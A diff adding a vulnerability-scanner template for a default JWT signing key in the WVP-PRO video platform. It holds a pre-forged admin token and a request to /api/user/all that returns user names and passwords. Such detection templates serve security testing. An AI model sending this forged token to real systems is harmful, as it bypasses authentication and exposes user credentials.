@@ -1,0 +1,34 @@
+id: wvp-28181-default-key
+
+info:
+  name: WVP-PRO 视频管理平台默认秘钥漏洞
+  author: onewin
+  severity: high
+  description: |
+    WVP-PRO 视频管理平台默认秘钥漏洞（JwtUtils.java中硬编码了默认密钥ID和RSA密钥对，如果jwk.json文件不存在或读取失败，会使用默认生成的密钥）。
+  metadata:
+    max-request: 1
+  tags: WVP视频平台
+
+http:
+  - raw:
+    - |+
+      @timeout: 30s
+      GET /api/user/all HTTP/1.1
+      Host: {{Hostname}}
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+      access-token: eyJhbGciOiJSUzI1NiIsImtpZCI6ImRlZmF1bHRfa2V5XzE3NTI1MDc1MDMiLCJ0eXAiOiJKV1QifQ.eyJqdGkiOiIxNzUyNTA3NTAzIiwiaWF0IjoxNzUyNTA3NTAzLCJleHAiOjQ5MDYxMDc1MDMsIm5iZiI6MTc1MjUwNzQ0Mywic3ViIjoibG9naW4iLCJhdWQiOiJBdWRpZW5jZSIsInVzZXJOYW1lIjoiYWRtaW4ifQ.dTsbuTGsPZCEW8q1IEkX1vhNwNCDNGJwig8PJd9m1MO-pr7S6Iov45ft_iDkxT_Z10gvjQaCrrLl2cEYGMQl3zxANV7FxOHghxSc_YY8qLqUK3P782h6DHFp_yXvDyFqpymoCSFbbUj4ZaQhNkHd6b6HXmPEb25_C-RU2ap063P0eJAzZndSuJ0Kh3vYFktfvXecEgZLpn7pFKbnlBYHsrj0g89J1POpZAApbo-IkLgup9YPjqiNbwqHyiOEKBdylKFzyDRD1NGU0TPDPqWAh538xZcw3xlTt9wSJM9T2wlPPO-gTfuNXvM0Joe1p91TeMvkQlcOOJrZjxIwI-IwxA
+      X-XSS-Protection: 1
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'username'
+          - 'password'
+          - 'createTime'
+          - 'updateTime'
+        condition: and
+      - type: status
+        status:
+          - 200
